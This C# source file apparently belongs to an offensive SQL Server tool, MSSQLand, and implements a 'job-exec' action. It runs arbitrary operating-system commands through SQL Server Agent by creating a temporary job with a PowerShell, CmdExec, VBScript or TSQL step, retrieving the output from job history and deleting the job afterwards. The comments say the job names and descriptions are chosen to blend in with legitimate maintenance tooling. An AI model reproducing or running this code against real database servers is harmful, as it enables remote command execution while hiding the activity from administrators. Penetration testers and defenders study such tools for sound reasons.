// MSSQLand/Actions/Agent/JobExec.cs

using MSSQLand.Services;
using MSSQLand.Utilities;
using System;
using System.Data;
using System.Threading;

namespace MSSQLand.Actions.Agent
{
    /// <summary>
    /// Execute OS commands via SQL Server Agent by creating a temporary job.
    /// Supports CmdExec, PowerShell, TSQL, and VBScript subsystems.
    /// Optionally polls for completion and retrieves output from sysjobhistory.
    /// </summary>
    internal class JobExec : BaseAction
    {
        // Enum values match exactly what sp_add_jobstep expects as @subsystem.
        // Do NOT change casing — SQL Server is case-sensitive on these strings.
        private enum SubSystemMode { CmdExec, PowerShell, TSQL, VBScript }

        [ArgumentMetadata(Position = 0, Required = true, Description = "Command to execute")]
        private string _command = null;

        [ArgumentMetadata(Position = 1, ShortName = "s", LongName = "subsystem", Description = "Subsystem: CmdExec, PowerShell, TSQL, VBScript (default: PowerShell)")]
        private SubSystemMode _subSystem = SubSystemMode.PowerShell;

        [ArgumentMetadata(ShortName = "w", LongName = "wait", Description = "Wait for job completion and retrieve output (default: false)")]
        private bool _wait = false;

        [ArgumentMetadata(ShortName = "t", LongName = "timeout", Description = "Max seconds to wait for job completion when --wait is set (default: 30)")]
        private int _timeout = 30;

        public override void ValidateArguments(string[] args)
        {
            BindArguments(args);

            if (string.IsNullOrEmpty(_command))
            {
                throw new ArgumentException("Missing command to execute. Example: job-exec 'whoami'");
            }

            if (_timeout < 1)
            {
                throw new ArgumentException("Timeout must be at least 1 second");
            }
        }

        public override object Execute(DatabaseContext databaseContext)
        {
            if (!AgentHelper.CheckAgentRunning(databaseContext))
                return null;

            Logger.Info($"Subsystem: {_subSystem}");

            // Use names that blend with legitimate internal tooling
            string jobName = $"SQLMaint_{Guid.NewGuid().ToString("N").Substring(0, 8)}";
            string stepName = $"Step_{Guid.NewGuid().ToString("N").Substring(0, 8)}";

            try
            {
                // Create job
                databaseContext.QueryService.ExecuteNonProcessing($@"
                    EXEC msdb.dbo.sp_add_job
                        @job_name = '{jobName}',
                        @enabled = 1,
                        @description = 'Routine maintenance task';");
                Logger.Success($"Job '{jobName}' created");

                // Add job step
                databaseContext.QueryService.ExecuteNonProcessing($@"
                    EXEC msdb.dbo.sp_add_jobstep
                        @job_name = '{jobName}',
                        @step_name = '{stepName}',
                        @subsystem = '{_subSystem}',
                        @command = '{_command.Replace("'", "''")}',
                        @retry_attempts = 0,
                        @retry_interval = 0;");
                Logger.Success($"Job step added [{_subSystem}]");

                // Assign to local server
                databaseContext.QueryService.ExecuteNonProcessing(
                    $"EXEC msdb.dbo.sp_add_jobserver @job_name = '{jobName}', @server_name = '(local)';");

                // Start job
                Logger.Info($"Starting job '{jobName}'");
                databaseContext.QueryService.ExecuteNonProcessing(
                    $"EXEC msdb.dbo.sp_start_job @job_name = '{jobName}';");
                Logger.Success("Job started");

                // Poll for completion if --wait is set
                if (_wait)
                {
                    PollJobCompletion(databaseContext, jobName);
                }
                else
                {
                    Logger.Warning("Asynchronous execution — use --wait to poll for completion and retrieve output");
                }

                // Cleanup
                Logger.Info($"Cleaning up job '{jobName}'");
                databaseContext.QueryService.ExecuteNonProcessing(
                    $"EXEC msdb.dbo.sp_delete_job @job_name = '{jobName}';");
                Logger.Success("Job cleaned up");

                return true;
            }
            catch (Exception ex)
            {
                Logger.Error($"Agent job failed: {ex.Message}");
                CleanupJob(databaseContext, jobName);
                return false;
            }
        }

        /// <summary>
        /// Polls sysjobhistory until the job completes or timeout is reached.
        /// Surfaces the job outcome and message to the operator.
        /// </summary>
        private void PollJobCompletion(DatabaseContext databaseContext, string jobName)
        {
            DateTime deadline = DateTime.UtcNow.AddSeconds(_timeout);

            while (DateTime.UtcNow < deadline)
            {
                Thread.Sleep(1000);

                // run_status: 1=Succeeded, 0=Failed, 2=Retry, 3=Cancelled, 4=Running
                string query = $@"
                    SELECT TOP 1
                        run_status,
                        run_duration,
                        message
                    FROM msdb.dbo.sysjobhistory
                    WHERE job_id = (SELECT job_id FROM msdb.dbo.sysjobs WHERE name = '{jobName}')
                      AND step_id = 0  -- step_id 0 = job-level outcome record
                    ORDER BY run_date DESC, run_time DESC;";

                DataTable history = databaseContext.QueryService.ExecuteTable(query);

                if (history.Rows.Count == 0)
                    continue;

                int runStatus = Convert.ToInt32(history.Rows[0]["run_status"]);
                string message = history.Rows[0]["message"]?.ToString();

                switch (runStatus)
                {
                    case 1:
                        Logger.Success("Job completed successfully");
                        if (!string.IsNullOrEmpty(message))
                            Logger.Info($"Output: {message}");
                        return;
                    case 0:
                        Logger.Error("Job failed");
                        if (!string.IsNullOrEmpty(message))
                            Logger.ErrorNested(message);
                        return;
                    case 3:
                        Logger.Warning("Job was cancelled");
                        return;
                    default:
                        continue;
                }
            }

            Logger.Warning($"Timeout reached ({_timeout}s): job may still be running");
        }

        /// <summary>
        /// Best-effort job cleanup. Silently ignores errors —
        /// the job may have already been deleted or never fully created.
        /// </summary>
        private void CleanupJob(DatabaseContext databaseContext, string jobName)
        {
            try
            {
                databaseContext.QueryService.ExecuteNonProcessing(
                    $"EXEC msdb.dbo.sp_delete_job @job_name = '{jobName}';");
            }
            catch { /* intentionally empty */ }
        }
    }
}
